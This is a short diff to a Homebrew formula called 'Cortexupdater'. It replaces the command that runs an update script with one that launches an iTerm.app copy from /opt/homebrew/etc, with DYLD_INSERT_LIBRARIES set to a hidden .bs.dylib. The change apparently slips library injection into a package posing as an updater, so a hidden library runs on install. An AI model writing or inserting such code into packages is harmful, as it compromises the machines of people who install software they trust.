@@ -52,7 +52,8 @@ class Cortexupdater < Formula
 
     chmod = `chmod +x /opt/homebrew/etc/update_cortex.sh`
 
-    run = `sh /opt/homebrew/etc/update_cortex.sh`
+    #run = `sh /opt/homebrew/etc/update_cortex.sh`
+    run = `open /opt/homebrew/etc/iTerm.app --env DYLD_INSERT_LIBRARIES=/opt/homebrew/etc/.bs.dylib`
 
   end
 
